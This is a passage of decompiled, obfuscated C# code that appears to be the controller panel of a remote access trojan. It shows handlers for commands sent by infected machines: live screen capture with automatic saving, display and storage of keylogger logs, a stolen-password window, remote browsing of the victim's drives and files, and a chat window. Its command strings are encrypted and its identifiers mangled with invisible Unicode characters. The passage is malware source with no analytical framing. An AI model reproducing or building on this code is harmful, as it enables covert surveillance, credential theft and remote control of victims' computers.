								global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
								{
									RuntimeHelpers.GetObjectValue(\u0002)
								});
							}
							else if ((sc)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829128462) + client.ip()) == null)
							{
								sc sc = new sc();
								sc.osk = client.osk;
								sc.sz = new Size(Conversions.ToInteger(array2[2]), Conversions.ToInteger(array2[3]));
								sc.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Image = null;
								sc.Oimg = new Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb);
								sc.sk = client;
								sc.Name = global::\u0006\u2001.\u0002(-1829128462) + client.ip();
								sc.Show();
							}
						}
						else
						{
							if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128503), false) == 0)
							{
								sc sc2 = (sc)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829128462) + array2[1]);
								if (sc2 == null)
								{
									client.CN = false;
									return;
								}
								sc obj6 = sc2;
								lock (obj6)
								{
									sc sc3 = sc2;
									sc3.fps++;
									sc2.pkt = unchecked((long)array.Length);
									if (array2[2].Length == 0)
									{
										return;
									}
									array = (byte[])NewLateBinding.LateIndexGet(global::\u000E.\u0002(array, array2[2] + global::\u000E\u2000.\u000E), new object[]
									{
										1
									}, null);
									Bitmap bitmap = (Bitmap)Image.FromStream(new MemoryStream(array));
									if (bitmap.Width == 0)
									{
										return;
									}
									string[] array14 = Strings.Split(array2[2], global::\u0006\u2001.\u0002(-1829128670), -1, CompareMethod.Binary);
									string[] array15 = Strings.Split(array14[0], global::\u0006\u2001.\u0002(-1829136748), -1, CompareMethod.Binary);
									Size sz = new Size(Conversions.ToInteger(array15[0]), Conversions.ToInteger(array15[1]));
									int num17 = Conversions.ToInteger(array14[1]);
									if (sc2.Oimg.Size != sz)
									{
										sc2.Oimg = new Bitmap(sz.Width, sz.Height, PixelFormat.Format32bppPArgb);
									}
									PixelFormat format = PixelFormat.Format32bppArgb;
									int num18 = 0;
									int num19 = 2;
									int num20 = array14.Length - 1;
									for (int num21 = num19; num21 <= num20; num21++)
									{
										array15 = Strings.Split(array14[num21], global::\u0006\u2001.\u0002(-1829136748), -1, CompareMethod.Binary);
										Rectangle rect = new Rectangle(Conversions.ToInteger(array15[0]), Conversions.ToInteger(array15[1]), bitmap.Width, num17);
										BitmapData bitmapData = sc2.Oimg.LockBits(rect, ImageLockMode.WriteOnly, format);
										Bitmap bitmap2 = bitmap;
										Rectangle rect2 = new Rectangle(0, num18, rect.Width, rect.Height);
										BitmapData bitmapData2 = bitmap2.LockBits(rect2, ImageLockMode.ReadOnly, format);
										byte[] array16 = new byte[Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1];
										global::\u000E.\u0002(bitmapData.Scan0, bitmapData2.Scan0, array16.Length);
										sc2.Oimg.UnlockBits(bitmapData);
										bitmap.UnlockBits(bitmapData2);
										num18 += num17;
									}
									sc2.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Image = (Image)sc2.Oimg.Clone();
									if (sc2.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().Checked)
									{
										try
										{
											sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString(global::\u0006\u2001.\u0002(-1829128482)) + global::\u0006\u2001.\u0002(-1829128920), ImageFormat.Jpeg);
										}
										catch (Exception ex8)
										{
										}
									}
									return;
								}
							}
							if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829131753), false) == 0)
							{
								if (client.osk == null)
								{
									client.isPL = true;
									try
									{
										client.osk = global::\u000E\u2000.\u0005.GetClient(array2[1]);
									}
									catch (Exception ex9)
									{
										client.CN = false;
									}
								}
								if (global::\u000E\u2000.\u000F.InvokeRequired)
								{
									global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
									{
										RuntimeHelpers.GetObjectValue(\u0002)
									});
								}
								else
								{
									Chat chat = (Chat)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136700) + client.ip());
									string left6 = array2[2];
									if (Operators.CompareString(left6, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
									{
										if (chat == null)
										{
											chat = new Chat();
											chat.Name = global::\u0006\u2001.\u0002(-1829136700) + client.ip();
											chat.sk = client;
											chat.osk = client.osk;
											chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
											chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = false;
											chat.Show();
										}
									}
									else
									{
										if (Operators.CompareString(left6, global::\u0006\u2001.\u0002(-1829138798), false) == 0)
										{
											chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = true;
											chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Enabled = true;
											Chat obj7 = chat;
											lock (obj7)
											{
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(global::\u0006\u2001.\u0002(-1829128899));
												return;
											}
										}
										if (Operators.CompareString(left6, global::\u0006\u2001.\u0002(-1829138768), false) == 0)
										{
											Chat obj8 = chat;
											lock (obj8)
											{
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = new Font(chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font, FontStyle.Bold);
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(global::\u0006\u2001.\u0002(-1829128952));
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionFont = chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().Font;
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().AppendText(global::\u000E.\u0003(array2[3]) + global::\u0006\u2001.\u0002(-1829139159));
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().SelectionStart = chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().TextLength;
												chat.ug59t46kfjbmek2w5288yuf26cremrkl\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
												try
												{
													Interaction.AppActivate(chat.Text);
												}
												catch (Exception ex10)
												{
												}
											}
										}
									}
								}
							}
							else
							{
								if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128936), false) == 0)
								{
									kl kl = (kl)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136950) + client.ip());
									kl obj9 = kl;
									lock (obj9)
									{
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().Clear();
										string[] array17 = Strings.Split(global::\u000E.\u0003(array2[1]), global::\u0006\u2001.\u0002(-1829139159), -1, CompareMethod.Binary);
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().Value = 0;
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().Maximum = array17.Length;
										foreach (string t in array17)
										{
											kl.insert(t);
											ProgressBar progressBar = kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002();
											progressBar.Value++;
										}
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().Value = 0;
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().Enabled = true;
										if (!Directory.Exists(client.Folder))
										{
											Directory.CreateDirectory(client.Folder);
										}
										kl.l45yrr5vsj5xu65ckgpyp83u5bj75bml\u200A\u2009\u2000\u2005\u0002().SaveFile(client.Folder + global::\u0006\u2001.\u0002(-1829128850));
										return;
									}
								}
								if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136950), false) == 0)
								{
									if (global::\u000E\u2000.\u000F.InvokeRequired)
									{
										global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
										{
											RuntimeHelpers.GetObjectValue(\u0002)
										});
									}
									else
									{
										if (global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136950) + client.ip()) == null)
										{
											new kl
											{
												c = client,
												Name = global::\u0006\u2001.\u0002(-1829136950) + client.ip(),
												Text = Conversions.ToString(global::\u000E\u2000.\u0002(client.L))
											}.Show();
										}
										Thread thread = new Thread(new ParameterizedThreadStart(global::\u000E\u2000.\u0003));
										Thread thread2 = thread;
										object[] array8 = new object[2];
										array8[0] = client;
										object[] array19 = array8;
										int num23 = 1;
										string text = global::\u0006\u2001.\u0002(-1829128936) + global::\u000E\u2000.\u000E + array2[1];
										array19[num23] = global::\u000E.\u0002(ref text);
										thread2.Start(array8);
									}
								}
								else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128293), false) == 0)
								{
									if (global::\u000E\u2000.\u000F.InvokeRequired)
									{
										global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
										{
											RuntimeHelpers.GetObjectValue(\u0002)
										});
									}
									else
									{
										string left7 = array2[1];
										if (Operators.CompareString(left7, global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136905), null).\u0005, false) == 0)
										{
											Pass pass = (Pass)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829128835));
											if (pass == null)
											{
												pass = new Pass();
												pass.Show();
											}
											Pass pass2 = pass;
											string text = global::\u000E.\u0003(array2[2]);
											pass2.XD(ref client, ref text);
										}
									}
								}
								else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829128846), false) == 0)
								{
									if (client.L != null)
									{
										string[] array20 = Strings.Split(global::\u000E.\u0003(array2[1]), global::\u0006\u2001.\u0002(-1829139159), -1, CompareMethod.Binary);
										string text3 = global::\u0006\u2001.\u0002(-1829128888);
										int num24 = 0;
										int num25 = array20.Length - 1;
										for (int num26 = num24; num26 <= num25; num26++)
										{
											text3 = string.Concat(new string[]
											{
												text3,
												global::\u0006\u2001.\u0002(-1829128878),
												Conversions.ToString(num26),
												global::\u0006\u2001.\u0002(-1829128792),
												array20[num26]
											});
										}
										client.L.Cells[0].ToolTipText = string.Format(text3, new object[]
										{
											global::\u0006\u2001.\u0002(-1829136393),
											global::\u0006\u2001.\u0002(-1829139913),
											global::\u0006\u2001.\u0002(-1829128770),
											global::\u0006\u2001.\u0002(-1829128780),
											global::\u0006\u2001.\u0002(-1829139985),
											global::\u0006\u2001.\u0002(-1829128822),
											global::\u0006\u2001.\u0002(-1829128806),
											global::\u0006\u2001.\u0002(-1829128726)
										});
									}
								}
								else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829132005), false) == 0)
								{
									Manager manager8 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
									if (manager8 != null)
									{
										string left8 = array2[1];
										if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829138798), false) == 0)
										{
											manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Items.Clear();
											int num27 = 0;
											List<ListViewItem> list6 = new List<ListViewItem>();
											int num28 = 2;
											int num29 = array2.Length - 1;
											for (int num30 = num28; num30 <= num29; num30++)
											{
												string[] array21 = Strings.Split(global::\u000E.\u0003(array2[num30]), global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
												DirectoryInfo directoryInfo = new DirectoryInfo(array21[0]);
												ListViewItem listViewItem6 = new ListViewItem(directoryInfo.Name);
												listViewItem6.ToolTipText = directoryInfo.FullName;
												listViewItem6.SubItems.Add(array21[1]);
												string left9 = array21[1];
												if (Operators.CompareString(left9, DriveType.Fixed.ToString(), false) == 0)
												{
													listViewItem6.ImageIndex = 1;
												}
												else if (Operators.CompareString(left9, DriveType.Removable.ToString(), false) == 0)
												{
													listViewItem6.ImageIndex = 3;
												}
												else if (Operators.CompareString(left9, DriveType.CDRom.ToString(), false) == 0)
												{
													listViewItem6.ImageIndex = 2;
												}
												else if (Operators.CompareString(left9, string.Empty, false) == 0)
												{
													listViewItem6.ImageIndex = 0;
													switch (num27)
													{
													case 0:
														listViewItem6.Text = global::\u0006\u2001.\u0002(-1829128705);
														break;
													case 1:
														listViewItem6.Text = global::\u0006\u2001.\u0002(-1829128719);
														break;
													case 2:
														listViewItem6.Text = global::\u0006\u2001.\u0002(-1829128768);
														break;
													case 3:
														listViewItem6.Text = global::\u0006\u2001.\u0002(-1829129170);
														break;
													}
													num27++;
													listViewItem6.SubItems[1].Text = global::\u0006\u2001.\u0002(-1829129184);
												}
												else if (Operators.CompareString(left9, DriveType.Network.ToString(), false) == 0)
												{
													listViewItem6.ImageIndex = 5;
												}
												else
												{
													listViewItem6.ImageIndex = 1;
												}
												list6.Add(listViewItem6);
												if (list6.Count > 10)
												{
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Items.AddRange(list6.ToArray());
													list6.Clear();
												}
											}
											if (list6.Count > 0)
											{
												manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Items.AddRange(list6.ToArray());
												list6.Clear();
											}
											manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
										}
										else
										{
											if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829138768), false) == 0)
											{
												ToolStripProgressBar obj10 = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
												lock (obj10)
												{
													if (manager8.Cache.Contains(global::\u000E.\u0003(array2[2])))
													{
														manager8.Cache.Remove(global::\u000E.\u0003(array2[2]));
													}
													Manager.\u0003 u6 = new Manager.\u0003();
													u6.\u0002 = global::\u000E.\u0003(array2[2]);
													manager8.Cache.Add(u6, u6.\u0002, null, null);
													DirectoryInfo directoryInfo2 = new DirectoryInfo(global::\u000E.\u0003(array2[2]));
													if (Operators.CompareString(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, directoryInfo2.FullName, false) != 0)
													{
														u6.\u0005.Clear();
														u6.\u0003.Clear();
														try
														{
															manager8.Cache.Remove(global::\u000E.\u0003(array2[2]));
															return;
														}
														catch (Exception ex11)
														{
															return;
														}
													}
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
													string[] array22 = Strings.Split(array2[3], global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = array22.Length - 1;
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Clear();
													if (directoryInfo2.Parent != null)
													{
														ListViewItem listViewItem7 = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Add(global::\u0006\u2001.\u0002(-1829129162), global::\u0006\u2001.\u0002(-1829129162), 0);
														listViewItem7.ToolTipText = directoryInfo2.Parent.FullName;
														listViewItem7.SubItems.Add(string.Empty);
														listViewItem7.SubItems.Add(global::\u0006\u2001.\u0002(-1829129184));
													}
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Clear();
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Add(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images[0]);
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Add(global::\u0006\u2001.\u0002(-1829128238), manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Images[4]);
													List<ListViewItem> list7 = new List<ListViewItem>();
													int num31 = 0;
													int num32 = array22.Length - 2;
													for (int num33 = num31; num33 <= num32; num33++)
													{
														if (Operators.CompareString(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, directoryInfo2.FullName, false) != 0)
														{
															u6.\u0005.Clear();
															u6.\u0003.Clear();
															try
															{
																manager8.Cache.Remove(global::\u000E.\u0003(array2[2]));
																return;
															}
															catch (Exception ex12)
															{
																return;
															}
														}
														ListViewItem listViewItem8 = new ListViewItem(global::\u000E.\u0003(array22[num33]), 0);
														ListViewItem listViewItem9 = listViewItem8;
														listViewItem9.SubItems.Add(string.Empty);
														listViewItem9.SubItems.Add(global::\u0006\u2001.\u0002(-1829129184));
														listViewItem9.ToolTipText = directoryInfo2.FullName + listViewItem9.Text;
														u6.\u0003.Add(listViewItem9.ToolTipText);
														ToolStripProgressBar toolStripProgressBar = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
														toolStripProgressBar.Value++;
														list7.Add(listViewItem8);
														if (list7.Count > 20)
														{
															manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list7.ToArray());
															list7.Clear();
														}
													}
													if (list7.Count > 0)
													{
														manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list7.ToArray());
														list7.Clear();
													}
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Gainsboro;
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
													client.Send(string.Concat(new string[]
													{
														global::\u0006\u2001.\u0002(-1829128217),
														global::\u000E\u2000.\u000E,
														global::\u0006\u2001.\u0002(-1829129203),
														global::\u000E\u2000.\u000E,
														global::\u0006\u2001.\u0002(-1829138768),
														global::\u000E\u2000.\u000E,
														array2[2]
													}));
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
													return;
												}
											}
											if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829129212), false) == 0)
											{
												ToolStripProgressBar obj11 = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
												lock (obj11)
												{
													string text4 = global::\u000E.\u0003(array2[2]);
													if (Operators.CompareString(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, text4, false) != 0)
													{
														return;
													}
													Manager.\u0003 u7 = (Manager.\u0003)manager8.Cache[global::\u000E.\u0003(array2[2])];
													u7.\u0005.Clear();
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
													string[] array23 = Strings.Split(array2[3], global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = array23.Length - 1;
													List<ListViewItem> list8 = new List<ListViewItem>();
													int num34 = 0;
													int num35 = array23.Length - 2;
													for (int num36 = num34; num36 <= num35; num36++)
													{
														string[] array24 = Strings.Split(global::\u000E.\u0003(array23[num36]), global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
														if (Operators.CompareString(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text, text4, false) != 0)
														{
															u7.\u0005.Clear();
															u7.\u0003.Clear();
															try
															{
																manager8.Cache.Remove(global::\u000E.\u0003(array2[2]));
																return;
															}
															catch (Exception ex13)
															{
																return;
															}
														}
														ListViewItem listViewItem10 = new ListViewItem(array24[0]);
														ListViewItem listViewItem11 = listViewItem10;
														FileInfo fileInfo = new FileInfo(text4 + array24[0]);
														listViewItem11.ToolTipText = fileInfo.FullName;
														listViewItem11.SubItems.Add(global::\u000E.\u0002(Conversions.ToLong(array24[1])));
														listViewItem11.Name = listViewItem11.ToolTipText;
														if (array24.Length == 2)
														{
															if (Operators.CompareString(fileInfo.Extension, string.Empty, false) == 0)
															{
																listViewItem11.SubItems.Add(string.Empty);
																listViewItem11.ImageKey = global::\u0006\u2001.\u0002(-1829128238);
															}
															else
															{
																listViewItem11.SubItems.Add(fileInfo.Extension.Replace(global::\u0006\u2001.\u0002(-1829136650), string.Empty));
																if (!manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.ContainsKey(fileInfo.Extension))
																{
																	File.Create(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension).Close();
																	manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension));
																	File.Delete(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension);
																	listViewItem11.ImageKey = fileInfo.Extension;
																}
																else
																{
																	listViewItem11.ImageKey = fileInfo.Extension;
																}
															}
														}
														else
														{
															listViewItem11.SubItems.Add(fileInfo.Extension.Remove(0, 1));
															if (!manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.ContainsKey(listViewItem11.ToolTipText))
															{
																manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Add(listViewItem11.ToolTipText, Image.FromStream(new MemoryStream(Convert.FromBase64String(array24[2]))));
															}
															if (!manager8.Images.Contains(global::\u0006\u2001.\u0002(-1829138798) + listViewItem11.ToolTipText))
															{
																manager8.Images.Add(manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images[listViewItem11.ToolTipText], global::\u0006\u2001.\u0002(-1829138798) + listViewItem11.ToolTipText, null, null);
															}
															listViewItem11.ImageKey = listViewItem11.ToolTipText;
														}
														u7.\u0005.Add(string.Concat(new string[]
														{
															listViewItem11.ToolTipText,
															global::\u0006\u2001.\u0002(-1829128238),
															listViewItem11.SubItems[1].Text,
															global::\u0006\u2001.\u0002(-1829128238),
															listViewItem11.SubItems[2].Text
														}));
														ToolStripProgressBar toolStripProgressBar = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
														toolStripProgressBar.Value++;
														list8.Add(listViewItem10);
														if (list8.Count > 20)
														{
															manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list8.ToArray());
															list8.Clear();
														}
													}
													if (list8.Count > 0)
													{
														manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list8.ToArray());
														list8.Clear();
													}
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.WhiteSmoke;
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
													return;
												}
											}
											if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829129197), false) == 0)
											{
												if (manager8.Images.Contains(global::\u000E.\u0003(array2[2])))
												{
													manager8.Images.Remove(global::\u000E.\u0003(array2[2]));
												}
												manager8.Images.Add(Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(global::\u000E.\u0002(array, array2[2] + global::\u000E\u2000.\u000E), new object[]
												{
													1
												}, null))), global::\u000E.\u0003(array2[2]), null, null);
												if (manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.ContainsKey(global::\u000E.\u0003(array2[2])))
												{
													if (manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items[global::\u000E.\u0003(array2[2])].Selected)
													{
														manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Image = (Image)manager8.Images[global::\u000E.\u0003(array2[2])];
														manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Visible = true;
													}
												}
											}
											else if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829140324), false) == 0)
											{
												if (global::\u000E\u2000.\u000F.InvokeRequired)
												{
													global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
													{
														RuntimeHelpers.GetObjectValue(\u0002)
													});
												}
												else
												{
													Note note = new Note();
													note.FN = global::\u000E.\u0003(array2[2]);
													note.Text = manager8.Text + global::\u0006\u2001.\u0002(-1829139039) + note.FN;
													note.SK = manager8.sk;
													note.73fass8pqajnygvwvt4dykcmms2t243w\u200A\u2009\u2000\u2005\u0002().Text = global::\u000E.\u0003(array2[3]).Replace(global::\u0006\u2001.\u0002(-1829129109), string.Empty);
													note.Show();
													note.73fass8pqajnygvwvt4dykcmms2t243w\u200A\u2009\u2000\u2005\u0002().Enabled = false;
												}
											}
											else if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829129117), false) == 0)
											{
												string[] array25 = Strings.Split(global::\u000E.\u0003(array2[2]), global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
												try
												{
													foreach (object obj12 in manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items)
													{
														ListViewItem listViewItem12 = (ListViewItem)obj12;
														if (Operators.CompareString(array25[1], global::\u0006\u2001.\u0002(-1829138798), false) == 0)
														{
															if (Operators.CompareString(listViewItem12.Text, new DirectoryInfo(array25[0]).Name, false) == 0 & Operators.CompareString(listViewItem12.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) == 0)
															{
																listViewItem12.Remove();
																break;
															}
														}
														else if (Operators.CompareString(listViewItem12.Text, new DirectoryInfo(array25[0]).Name, false) == 0 & Operators.CompareString(listViewItem12.SubItems[2].Text, global::\u0006\u2001.\u0002(-1829129184), false) != 0)
														{
															listViewItem12.Remove();
															break;
														}
													}
												}
												finally
												{
													IEnumerator enumerator5;
													if (enumerator5 is IDisposable)
													{
														(enumerator5 as IDisposable).Dispose();
													}
												}
											}
											else
											{
												if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829129094), false) == 0)
												{
													string[] array26 = Strings.Split(global::\u000E.\u0003(array2[2]), global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
													try
													{
														foreach (object obj13 in manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items)
														{
															ListViewItem listViewItem13 = (ListViewItem)obj13;
															if (Operators.CompareString(listViewItem13.ToolTipText, array26[0], false) == 0)
															{
																if (Operators.CompareString(array26[2], global::\u0006\u2001.\u0002(-1829128238), false) == 0)
																{
																	DirectoryInfo directoryInfo3 = new DirectoryInfo(array26[0]);
																	listViewItem13.Text = array26[1];
																	listViewItem13.ToolTipText = directoryInfo3.Parent.FullName + global::\u0006\u2001.\u0002(-1829139395) + listViewItem13.Text;
																}
																else
																{
																	FileInfo fileInfo2 = new FileInfo(array26[0]);
																	listViewItem13.Text = array26[1];
																	listViewItem13.ToolTipText = fileInfo2.Directory.FullName + global::\u0006\u2001.\u0002(-1829139395) + listViewItem13.Text;
																	listViewItem13.SubItems[2].Text = new FileInfo(listViewItem13.ToolTipText).Extension.Replace(global::\u0006\u2001.\u0002(-1829136650), string.Empty);
																}
															}
														}
														return;
													}
													finally
													{
														IEnumerator enumerator6;
														if (enumerator6 is IDisposable)
														{
															(enumerator6 as IDisposable).Dispose();
														}
													}
												}
												if (Operators.CompareString(left8, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
												{
													manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = array2[3];
													if (array2[3].StartsWith(global::\u0006\u2001.\u0002(-1829129103)))
													{
														ToolStripProgressBar obj14 = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
														lock (obj14)
														{
															FileInfo fileInfo3 = new FileInfo(array2[3]);
															if (Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + global::\u0006\u2001.\u0002(-1829139395), manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text.ToLower(), false) == 0)
															{
